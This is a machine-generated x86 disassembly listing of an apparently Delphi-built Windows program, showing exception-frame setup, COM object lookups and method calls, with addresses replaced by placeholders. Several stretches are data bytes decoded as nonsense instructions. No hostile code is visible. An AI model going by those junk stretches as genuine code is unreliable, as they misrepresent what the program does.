and dl 0xfc
mov eax esi
call sub_420760
test bl bl
jle r-xdata
mov eax [ esi + 0x38 ]
call sub_403234
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_4655ac
push ebx
mov ebx eax
mov eax ebx
call sub_420b64
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_465744
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
sub_4655d4
push ebp
mov ebp esp
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46571e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46572c
sub al 0x1
jb r-xdata
mov eax esi
call sub_405a38
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetActiveObject
call sub_417868
test al al
jne r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465725
lea eax [ ebp - 0x24 ]
call sub_404714
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_40402c
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4640a0
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4640a0
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_405a38
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetActiveObject
mov esi eax
mov eax esi
call sub_417868
test al al
jne r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x30 ]
call sub_464074
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x30 ]
call sub_464048
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405efc
mov eax [ ebp - 0x20 ]
mov ecx 0x1
pop edx
call sub_40905c
push esi
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_463eac
call sub_4039c0
jmp r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
call sub_404860
mov eax [ ebp - 0x24 ]
mov ecx esi
mov edx [ ebx + 0x30 ]
call sub_4640d8
jmp r-xdata
sub_465760
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4032e8
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_4657a8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4657cd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4657d4
retn
sub_4657f4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_465819
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465820
retn
sub_46582e
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
inc eax
add [ eax + eax ] dl
add [ eax ] al
push cs
push esp
inc ebx
jne r-xdata
add dh dh
pop eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 2 + 0x46 ] ah
add [ eax + eax ] dl
add [ eax ] al
sub al 0x12
inc eax
add [ esp + esi + 0x40 ] bh
add [ eax - 0x3bffbfa6 ] bh
pop edx
inc eax
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah dl
pop edx
inc eax
add al ch
xor [ eax ] eax
and al 0x32
inc eax
add [ eax ] dl
push esp
inc ecx
popad
jo r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
mov eax eax
pop ecx
inc esi
je r-xdata
jns r-xdata
jb r-xdata
add [ eax + 0x4658 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x1c004658 ] bl
add [ eax ] al
add [ edx + edx ] ch
inc eax
add [ esp + esi + 0x40 ] bh
add [ eax - 0x3bffbfa6 ] bh
pop edx
inc eax
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah dl
pop edx
inc eax
add al ch
xor [ eax ] eax
fcomp [ esi + 0x46 ]
add [ edi + ebx * 2 ] al
inc esi
add [ edx + ebp ] ch
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx + edx + 0x40 ] bh
add [ eax + eax ] cl
add [ eax ] al
jl r-xdata
inc eax
add ah cl
add [ esp + 0x4 ] 0xfffffff0
jmp r-xdata
add [ eax ] al
insd
inc ecx
popad
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2800465a ] cl
add [ eax ] al
add [ eax + ebx * 2 ] ch
inc esi
add [ esp + esi + 0x40 ] bh
add [ eax - 0x3bffbfa6 ] bh
pop edx
inc eax
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah dl
pop edx
inc eax
add al ch
xor [ eax ] eax
fcomp [ esi + 0x46 ]
add [ eax + 0x62 ] bl
inc esi
add [ eax + 0xc004660 ] dl
push esp
inc esi
outsd
outsb
je r-xdata
inc esi
add [ ecx - 0x4cffb9a7 ] al
pop ecx
inc esi
add [ ebp - 0x38ffb9a7 ] bh
pop ecx
inc esi
add [ edi + 0x2004659 ] ah
add [ eax ] al
add [ eax + 0x57cba55c ] ah
push cs
rcl [ ecx ] 0x1
mov ebp 0xaf20002f
push cs
pop ebx
adc ebx 0x20004659
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
and esi [ esi - 0x2fbb58e1 ]
adc [ esi - 0x50dfff6d ] ebx
inc [ ebx - 0x23fbdbbc ]
jmp sub_405b0c
outsd
je r-xdata
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
xor edx edx
push ebp
push sub_46602b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0xc ]
mov edx [ eax ]
call [ edx + 0x4 ]
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
add al 0x24
retn
popad
jo r-xdata
add [ ebp + 0x79004659 ] bl
pop ecx
imul sp [ ebp + 0x72 ] 0x408d
add ah cl
add eax 0xffffffe0
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
add bl dl
jb r-xdata
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_466529
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edx
inc esi
add ch bl
pop edx
inc esi
add bh ah
pop edx
inc esi
add bh al
pop edx
inc esi
add [ edx ] al
add [ eax ] al
add [ ecx ] dh
dec ebp
pop ebp
jns r-xdata
mov bl 0x5a
inc esi
add [ ebp - 0x66ffb9a6 ] bh
pop edx
inc esi
add [ ecx - 0x2cffb9a6 ] ah
inc ebx
rcl [ ecx ] 0x1
sahf
xchg edx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x5af4da82
inc esi
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
and esi [ esi - 0x2fbb58e1 ]
adc [ esi - 0x50dfff6d ] ebx
cmp eax 0x5b08da82
inc esi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x1800465b ]
pop ebx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2800465b ] ch
add [ eax ] al
add [ eax + ebx * 2 ] ch
inc esi
add [ esp + esi + 0x40 ] bh
add [ eax - 0x3bffbfa6 ] bh
pop edx
inc eax
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah dl
pop edx
inc eax
add al ch
xor [ eax ] eax
fcomp [ esi + 0x46 ]
add [ edi + ebx * 2 ] al
inc esi
add [ esi ] al
inc esi
add [ edi ] cl
push esp
push eax
imul esp [ ebx + 0x74 ] 0x41657275
popad
jo r-xdata
cmp eax 0x59e7da82
inc esi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
sbb [ edx + 0x46 ] 0x0
neg [ ecx + 0x46 ]
scasd [ edi ]
inc eax
add ah cl
add eax 0xffffffe0
jmp r-xdata
mov eax esi
mov edx [ ebx + 0xc ]
mov ecx r-xdata
call sub_405a7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466530
lea eax [ ebp - 0x2c ]
call sub_404008
lea eax [ ebp - 0x8 ]
call sub_405a38
lea eax [ ebp - 0x4 ]
call sub_404714
retn
lea edx [ ebp - 0x2c ]
mov eax [ ebx + 0x1c ]
call sub_423cb4
mov edx [ ebp - 0x2c ]
lea eax [ ebp - 0x4 ]
call sub_404860
mov [ ebp - 0x28 ] 0x20
mov eax [ ebp - 0x4 ]
call sub_404870
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x1c ]
call sub_423d28
mov [ ebp - 0x30 ] eax
fild [ ebp - 0x30 ]
fmul [ r-xdata ]
fistp [ ebp - 0x20 ]
fwait
mov eax [ ebx + 0x1c ]
call sub_423d64
test al 0x1
je r-xdata
inc esi
jb r-xdata
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x18 ] 0x190
mov [ ebp - 0x18 ] 0x2bc
jmp r-xdata
call sub_40282c
inc esi
add [ eax + 0x62 ] ch
inc edx
add [ eax ] dh
pop edi
inc edx
add [ eax ] ch
insb
inc esi
add ah bh
popad
inc edx
add [ esp + ebp * 2 ] ch
inc esi
add [ esp + ebp * 2 + 0x46 ] bh
add [ eax ] al
insd
inc esi
add [ ebp + ebp * 2 + 0x46 ] cl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al al
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5c ] ch
inc esi
add [ esp + ebx * 2 + 0x46 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jpe r-xdata
pop esp
inc esi
add [ eax ] al
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_405a7c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
mov [ ebp - 0x2c ] 0x14
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x1c ]
mov ebx [ esi + 0xc ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ ebx + 0x1c ]
call sub_423dcc
and eax 0xff
mov [ ebp - 0x16 ] ax
mov eax [ ebx + 0x1c ]
call sub_423d64
test al 0x2
setne al
neg al
sbb eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x1c ]
call sub_423d64
test al 0x4
setne al
neg al
sbb eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x1c ]
call sub_423d64
test al 0x8
setne al
neg al
sbb eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
call sub_405a38
mov ecx eax
mov edx r-xdata
lea eax [ ebp - 0x28 ]
call sub_466e88
call sub_464030
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_465f10
mov eax 0x8000ffff
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jge r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
add [ eax ] ch
add [ eax ] al
add [ ebx ] cl
push esp
dec edi
insb
inc edi
inc edx
add [ eax + 0x6b ] bh
inc esi
add al al
imul eax [ esi ] 0x58
bound eax [ edx ]
loopne r-xdata
add [ ebx + ebp * 2 ] dl
inc esi
add [ ebx + ebp * 2 ] dh
inc esi
add al dh
popad
inc esi
add [ eax + eax ] ch
add [ eax ] al
pop eax
inc edx
add [ esp + esi + 0x40 ] bh
add [ eax ] cl
lodsb [ esi ]
inc ecx
add [ esp + esi + 0x34900040 ] cl
inc eax
add [ esp + esi + 0x31cc0040 ] al
inc eax
add al ch
xor [ eax ] eax
cmp [ edx - 0x54b7ffbf ] ch
inc ecx
add al bl
pop edi
inc edx
add al bl
push 0xac980046
inc ecx
add [ ecx + ebp * 2 ] cl
inc esi
add [ eax ] dl
imul eax [ esi ] r-xdata
sbb al 0x6a
inc esi
add [ eax - 0x7ffb996 ] dl
push 0x46
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_428cdc
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_466735
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x14 ]
call sub_42a47c
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x14 ]
call sub_42a4b0
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403234
retn
mov eax [ ebx + 0xc ]
pop ebx
retn
jpo r-xdata
jo r-xdata
mov [ ebp - 0x28 ] 0x4
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
jne r-xdata
mov [ ebp - 0x28 ] 0x3
mov eax esi
call sub_426888
call sub_42a700
mov [ ebp - 0x24 ] eax
jmp r-xdata
stc
dec [ ebx + 0x20538bc6 ]
add [ ebp + 0x1f ] dh
mov ecx ebx
mov eax [ r-xdata ]
call sub_466054
imul esp [ ebx - 0x75 ] 0x465c8cc0
add [ edi ] al
or edx [ edi + ecx * 2 + 0x6c ]
inc edi
jb r-xdata
mov eax esi
call sub_4268a0
call sub_4272d0
mov [ ebp - 0x24 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_427044
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_466845
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_426ca0
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_426cb8
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_426d10
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_466819
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x18 ]
call sub_424568
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466820
mov eax [ ebp - 0x18 ]
call sub_403234
retn
mov eax [ ebp - 0x8 ]
call sub_405a38
push eax
cmp [ ebp - 0x9 ] 0x1
cmc
sbb ecx ecx
mov edx r-xdata
lea eax [ ebp - 0x2c ]
call sub_466ea4
call sub_464030
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_465f10
mov ecx r-xdata
call sub_405a7c
pop esi
pop ebx
retn
lea eax [ ebx + 0x20 ]
call sub_405a50
mov eax esi
mov edx [ ebx + 0x20 ]
sub edx 0xffffffdc
mov edx eax
test edx edx
je r-xdata
jo r-xdata
imul esp [ ebx + 0x4 ] 0x1c00465c
daa
inc edx
add [ eax ] al
add [ edi ] al
inc ecx
js r-xdata
mov dl 0x1
je r-xdata
add [ eax + 0x57cba55c ] ah
push cs
rcl [ ecx ] 0x1
mov ebp 0xaf20002f
push cs
pop ebx
adc [ ebx + 0x56 ] 0xd88bf28b
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
insb
jae r-xdata
mov eax esi
mov edx [ ebx + 0x18 ]
mov ecx r-xdata
call sub_405a7c
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4665c8
mov edx eax
test edx edx
je r-xdata
add [ ebp - 0x17acffc0 ] cl
jbe r-xdata
lea eax [ ebx + 0x18 ]
call sub_405a50
sub edx 0xffffffdc
jb r-xdata
inc edi
call sub_4033c0
test al al
je r-xdata
stc
dec [ ebx - 0x743c7428 ]
adc eax r-xdata
sub_465af4
test eax 0xb300465a
pop edx
inc esi
add [ ebp - 0x66ffb9a6 ] bh
pop edx
inc esi
add [ ecx - 0x2cffb9a6 ] ah
pop edx
inc esi
add ch bl
pop edx
inc esi
add bh ah
pop edx
inc esi
add bh al
pop edx
inc esi
add [ edx ] al
add [ eax ] al
add [ ecx ] dh
dec ebp
pop ebp
jns r-xdata
mov bl 0x5a
inc ebx
rcl [ ecx ] 0x1
sahf
xchg edx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x5af4da82
inc esi
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
and esi [ esi - 0x2fbb58e1 ]
adc [ esi - 0x50dfff6d ] ebx
cmp eax 0x5b08da82
inc esi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x1800465b ]
pop ebx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2800465b ] ch
add [ eax ] al
add [ eax + ebx * 2 ] ch
inc esi
add [ esp + esi + 0x40 ] bh
add [ eax - 0x3bffbfa6 ] bh
pop edx
inc eax
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah dl
pop edx
inc eax
add al ch
xor [ eax ] eax
fcomp [ esi + 0x46 ]
add [ edi + ebx * 2 ] al
inc esi
add [ esi ] al
inc esi
add [ edi ] cl
push esp
push eax
imul esp [ ebx + 0x74 ] 0x41657275
popad
jo r-xdata
inc esi
jb r-xdata
call sub_40282c
inc esi
add [ eax + 0x62 ] ch
inc edx
add [ eax ] dh
pop edi
inc edx
add [ eax ] ch
insb
inc esi
add ah bh
popad
inc edx
add [ esp + ebp * 2 ] ch
inc esi
add [ esp + ebp * 2 + 0x46 ] bh
add [ eax ] al
insd
inc esi
add [ ebp + ebp * 2 + 0x46 ] cl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al al
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5c ] ch
inc esi
add [ esp + ebx * 2 + 0x46 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jpe r-xdata
pop esp
inc esi
add [ eax ] al
mov eax 0x8000ffff
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jge r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
add [ eax ] ch
add [ eax ] al
add [ ebx ] cl
push esp
dec edi
insb
inc edi
inc edx
add [ eax + 0x6b ] bh
inc esi
add al al
imul eax [ esi ] 0x58
bound eax [ edx ]
loopne r-xdata
add [ ebx + ebp * 2 ] dl
inc esi
add [ ebx + ebp * 2 ] dh
inc esi
add al dh
popad
inc esi
add [ eax + eax ] ch
add [ eax ] al
pop eax
inc edx
add [ esp + esi + 0x40 ] bh
add [ eax ] cl
lodsb [ esi ]
inc ecx
add [ esp + esi + 0x34900040 ] cl
inc eax
add [ esp + esi + 0x31cc0040 ] al
inc eax
add al ch
xor [ eax ] eax
cmp [ edx - 0x54b7ffbf ] ch
inc ecx
add al bl
pop edi
inc edx
add al bl
push 0xac980046
inc ecx
add [ ecx + ebp * 2 ] cl
inc esi
add [ eax ] dl
imul eax [ esi ] r-xdata
sbb al 0x6a
inc esi
add [ eax - 0x7ffb996 ] dl
push 0x46
mov eax [ ebx + 0xc ]
pop ebx
retn
jpo r-xdata
jo r-xdata
stc
dec [ ebx + 0x20538bc6 ]
add [ ebp + 0x1f ] dh
mov ecx ebx
mov eax [ r-xdata ]
call sub_466054
imul esp [ ebx - 0x75 ] 0x465c8cc0
add [ edi ] al
or edx [ edi + ecx * 2 + 0x6c ]
inc edi
jb r-xdata
mov ecx r-xdata
call sub_405a7c
pop esi
pop ebx
retn
lea eax [ ebx + 0x20 ]
call sub_405a50
mov eax esi
mov edx [ ebx + 0x20 ]
sub edx 0xffffffdc
mov edx eax
test edx edx
je r-xdata
jo r-xdata
imul esp [ ebx + 0x4 ] 0x1c00465c
daa
inc edx
add [ eax ] al
add [ edi ] al
inc ecx
js r-xdata
mov dl 0x1
je r-xdata
add [ eax + 0x57cba55c ] ah
push cs
rcl [ ecx ] 0x1
mov ebp 0xaf20002f
push cs
pop ebx
adc [ ebx + 0x56 ] 0xd88bf28b
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
insb
jae r-xdata
mov eax esi
mov edx [ ebx + 0x18 ]
mov ecx r-xdata
call sub_405a7c
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4665c8
mov edx eax
test edx edx
je r-xdata
add [ ebp - 0x17acffc0 ] cl
jbe r-xdata
lea eax [ ebx + 0x18 ]
call sub_405a50
sub edx 0xffffffdc
jb r-xdata
inc edi
call sub_4033c0
test al al
je r-xdata
stc
dec [ ebx - 0x743c7428 ]
adc eax r-xdata
sub_465cb0
push ebx
call sub_40282c
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax 0x8000ffff
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jge r-xdata
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_465cdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x20 ]
mov ecx r-xdata
call sub_405a7c
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_466054
mov edx eax
test edx edx
je r-xdata
lea eax [ ebx + 0x20 ]
call sub_405a50
sub edx 0xffffffdc
sub_465d2c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x18 ]
mov ecx r-xdata
call sub_405a7c
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4665c8
mov edx eax
test edx edx
je r-xdata
lea eax [ ebx + 0x18 ]
call sub_405a50
sub edx 0xffffffdc
sub_465d7c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_465dbf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_465cdc
mov eax [ ebp - 0x4 ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465dc6
lea eax [ ebp - 0x4 ]
call sub_405a38
retn
sub_465dcc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405aac
xor eax eax
push ebp
push sub_465e26
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_465cdc
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465e2d
lea eax [ ebp - 0x8 ]
call sub_405a38
lea eax [ ebp - 0x4 ]
call sub_405a38
retn
sub_465e34
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_465e77
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_465d2c
mov eax [ ebp - 0x4 ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465e7e
lea eax [ ebp - 0x4 ]
call sub_405a38
retn
sub_465e84
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403204
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_465fc4
mov edx eax
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_403558
lea eax [ esi + 0x14 ]
call sub_405a50
mov eax esi
test bl bl
je r-xdata
sub edx 0xfffffff8
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_465ed8
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax esi
call sub_465f94
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_465f10
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405aac
xor eax eax
push ebp
push sub_465f78
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_465f94
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_405a50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465f7f
lea eax [ ebp - 0x4 ]
call sub_405a38
retn
lea eax [ ebx + 0x10 ]
push eax
mov edx r-xdata
mov ecx [ ebx + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_46423c
sub_465fc4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403204
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_466054
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_465e84
mov [ edi + 0x1c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_466090
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_466234
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46623b
lea eax [ ebp - 0x28 ]
call sub_404008
lea eax [ ebp - 0x24 ]
call sub_405a38
lea eax [ ebp - 0xc ]
call sub_404714
retn
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_405a7c
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_404714
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov bl [ r-xdata ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
